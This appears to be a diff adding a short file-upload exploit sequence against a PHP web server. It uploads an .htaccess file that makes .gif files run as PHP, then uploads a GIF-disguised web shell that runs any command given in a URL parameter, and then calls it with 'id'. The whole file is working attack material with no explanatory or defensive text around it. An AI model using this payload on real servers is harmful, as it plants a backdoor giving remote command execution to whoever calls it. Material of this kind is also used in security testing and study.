@@ -1,0 +1,8 @@
+﻿POST / (multipart) file=.htaccess
+Content: AddType application/x-httpd-php .gif
+
+POST / (multipart) file=shell.gif
+Content: GIF89a<?php echo 'PWN:'; echo shell_exec($_GET['c']); ?>
+
+GET /upload/shell.gif?c=id HTTP/1.1
+
